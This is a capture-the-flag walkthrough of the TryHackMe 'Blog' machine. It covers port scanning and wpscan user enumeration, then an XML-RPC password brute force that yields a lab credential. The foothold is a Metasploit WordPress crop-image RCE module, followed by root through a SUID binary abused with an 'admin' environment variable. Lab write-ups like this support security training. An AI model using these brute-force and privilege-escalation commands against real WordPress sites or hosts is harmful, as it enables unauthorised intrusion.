# Blog THM - Write Up / Walkthrough
**Note: This write up details a penetration testing conducted in a virtual system hosted on tryhackme.com . This system was designed for training**

### Tools used:
```
nmap
nxc (NetExec)
steghide
dirsearch
wpscan
metasploit
```
# Executive summary
***Blog*** is a virtual system hosted by the plataform TryHackMe. I've conducted a penetration testing with the goal of identifying vulnerabilities, attack vectors, exploiting vulnerabilities and gaining root access. Activies were conducted to simulate an attacker.

# Summary Results
``
Blog was a medium machine to compromise. This machine focused his main exploration in the HTTP port, where the CMS Wordpress was located. Scans, brute forcing and use of exploits were conducted. Initial foothold was throughout a WordPress vulnerability, where a authenticated user with Author permissions could upload a malicious image file and get a reverse shell through Path traversal. This was possibile because of the chaining of vulnerabilities (CVE-2019-8942
CVE-2019-8943). The machine also had an logic flaw inside of a code, the specific file was located in /usr/sbin/checker. The code only checked whether the "admin" environment variable existed, without validating its value, the user id (uid) is set to root, leading to a full machine compromise.
``
# Attack narrative

A network scan was conducted using the tool 'nmap':
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-09-16T23:06:55+00:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-09-16T23:06:55
|_  start_date: N/A
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
````
Ports open: SSH, HTTP, SMB

## Veryfing SMB
The SMB port is open and allows a guest login. Inside of the SMB, there's a share called "pics" and it has some files, being only images and a video. After downloading it and doing a basic Forensics, nothing was found.

# HTTP port
As we can see, the website is using the CMS ***(Content Management System)*** Wordpress (version 5.0)

But before racing to search and exploit (some people do that), I decided to explore the website and verify directories and the WordPress it self.

### Fuzzing
I've started with a directory fuzzing/brute force with the tool **dirsearch** and these were the results:
```
0:29:45] 200 -    0B  - /favicon.ico                                      
[20:29:54] 200 -    7KB - /license.txt                                      
[20:30:11] 200 -    3KB - /readme.html                                      
[20:30:13] 403 -  273B  - /server-status                                    
[20:30:13] 403 -  273B  - /server-status/                                   
[20:30:35] 200 -    1B  - /wp-admin/admin-ajax.php                          
[20:30:35] 301 -  307B  - /wp-admin  ->  http://blog.thm/wp-admin/          
[20:30:35] 200 -    0B  - /wp-content/                                      
[20:30:36] 301 -  309B  - /wp-content  ->  http://blog.thm/wp-content/      
[20:30:36] 200 -  410B  - /wp-content/upgrade/                              
[20:30:36] 200 -  472B  - /wp-content/uploads/
[20:30:36] 301 -  310B  - /wp-includes  ->  http://blog.thm/wp-includes/    
[20:30:36] 200 -    4KB - /wp-includes/                                     
                                         
```
Almost reasuring that the website uses WordPress, with this information, we can peform a WordPress scan with the tool called 'wpscan'.

## WordPress Scan
I've conducted the enumeration of vulnerable vectors and users. The results revealed very valuable information:

```
i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)


+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
```

We can see that the users are 'kwheel' and 'bjoel' and their respective names. But if you observe further, you can see that XML-RPC is enabled, what that does?

**XML RPC** is originally created to help ***external*** applications to interact with a site. However, depending on the configuration, it can also be abused for authentication brute-force attempts.

So, now we'll perform a XML-RPC attack using the tool wpscan.

### XML-RPC attack
**Note: Example command of the tool:**
``wpscan --url http://example.com --usernames users.txt --passwords rockyou.txt --password-attack xmlrpc``

After some time, we got a successful hit on the user 'kwheel' (Karen Wheeler):

kwheel / cutiepie1

# Exploring WordPress
Logging in with the user kwheel, we can observe that this user only has Author permissions, that means that this user can only make posts.

But searching for vulnerabilities, the identified attack chain involved an authenticated user with Author privileges uploading a malicious image containing PHP code, followed by path traversal to place the file in a location where it could be executed.
In **metasploit** we have a module for that, it's called 'wp_crop_rce'. Source: https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/

### Metasploit
After exploiting the WordPress vulnerability, I obtained a Meterpreter session and used the shell command to interact with the underlying system. The shell was running as www-data.

# Privilege Escalation
After a long search for privilege escalation, there's a file that brings a lot of attention, located in:

``/usr/sbin/checker``

(Command used):
``find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null``


What this file does:
The program does not validate the contents of the variable. It only checks whether getenv("admin") returns a non-NULL pointer. Therefore, any existing admin environment variable satisfies the condition.

An example of the code:
```
int main() {
    if (getenv("admin")) {
        setuid(0);
        system("/bin/bash");
    } else {
        puts("Not an Admin");
    }
}
```
We can temporary create a value by doing:


admin=1 /usr/sbin/checker
and
/usr/sbin/checker

If the variable exists, the condition evaluates as true. The program then calls setuid(0), which sets the process UID to root, and executes /bin/bash through system().


We get the root privileges, leading to a full compromision of the machine.
